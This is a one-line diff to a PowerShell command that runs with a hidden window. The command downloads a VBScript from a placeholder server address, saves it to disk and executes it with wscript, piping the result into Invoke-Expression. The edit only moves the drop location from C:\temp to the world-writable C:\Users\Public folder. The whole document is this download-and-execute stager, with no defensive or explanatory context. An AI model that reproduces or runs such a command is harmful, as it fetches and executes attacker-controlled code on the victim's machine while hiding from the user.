@@ -1,1 +1,1 @@
-powershell.exe -windowstyle hidden -command Invoke-WebRequest "http://<SERVER_IP>:<SERVER_PORT>/s.vbs" -OutFile "C:\temp\s.vbs"; wscript "C:\temp\s.vbs" | Invoke-Expression
+powershell.exe -windowstyle hidden -command Invoke-WebRequest "http://<SERVER_IP>:<SERVER_PORT>/s.vbs" -OutFile "C:\Users\Public\s.vbs"; wscript "C:\Users\Public\s.vbs" | Invoke-Expression
